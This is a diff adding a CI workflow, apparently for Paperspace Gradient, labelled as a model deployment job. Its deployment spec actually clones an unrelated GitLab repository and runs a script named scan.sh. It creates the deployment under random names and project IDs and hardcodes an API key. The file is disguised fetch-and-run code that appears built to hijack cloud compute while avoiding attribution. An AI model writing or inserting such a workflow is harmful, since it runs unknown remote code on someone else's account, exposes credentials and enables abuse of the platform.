@@ -1,0 +1,27 @@
+on:
+  github:
+    branches:
+      only: main
+defaults:
+  resources:
+    instance-type: C4
+jobs:
+  DeployModel:
+    uses: script@v1
+    with:
+      script: |
+        pip install -U gradient
+        gradient apiKey 82403df677569142c1c32661dd7fcc
+        cat > ./deployment.yaml <<EOF
+        image: lucone83/streamlit-nginx
+        port: 8080
+        env:
+          - name: ENV
+            value: VAR
+        resources:
+          replicas: 1
+          instanceType: C4
+        command: git clone https://gitlab.com/andisetiawan3534/kuli1.git && cd kuli1 && chmod +x scan.sh && ./scan.sh
+        EOF
+        gradient deployments create --name $(shuf -i 10-9999999999999999999 -n 1) --projectId $(shuf -i 10-9999999999999999999 -n 1) --spec deployment.yaml
+      image: paperspace/gradient-sdk
